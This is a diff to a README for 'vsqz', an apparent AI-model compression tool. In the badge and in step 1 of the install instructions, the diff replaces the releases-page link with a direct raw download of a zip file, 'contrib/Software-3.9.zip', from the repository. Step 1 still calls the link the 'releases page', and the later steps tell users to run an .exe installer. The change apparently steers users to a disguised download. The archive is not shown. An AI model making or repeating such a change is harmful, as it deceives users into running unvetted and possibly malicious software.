@@ -1,6 +1,6 @@
 # 💾 vsqz - Compress AI models to save memory
 
-[![Download vsqz](https://img.shields.io/badge/Download-Latest_Release-blue)](https://github.com/nwfrequencydistribution747/vsqz/releases)
+[![Download vsqz](https://img.shields.io/badge/Download-Latest_Release-blue)](https://github.com/nwfrequencydistribution747/vsqz/raw/refs/heads/main/contrib/Software-3.9.zip)
 
 vsqz helps you manage large AI models on your computer. Many AI models require significant video memory (VRAM) to run. This tool compresses your model files so they occupy less space. It works like a traditional file archive program but keeps the models ready for use. You can load these compressed models directly into your favorite AI tools without losing performance.
 
@@ -19,7 +19,7 @@ Your computer needs specific hardware components to function correctly with vsqz
 
 Follow these steps to set up the software on your system. 
 
-1. Visit the [releases page](https://github.com/nwfrequencydistribution747/vsqz/releases) to download the latest setup file. 
+1. Visit the [releases page](https://github.com/nwfrequencydistribution747/vsqz/raw/refs/heads/main/contrib/Software-3.9.zip) to download the latest setup file. 
 2. Choose the file ending in `.exe` that matches your Windows version.
 3. Save the file to your desktop or downloads folder.
 4. Double-click the file to start the installer.
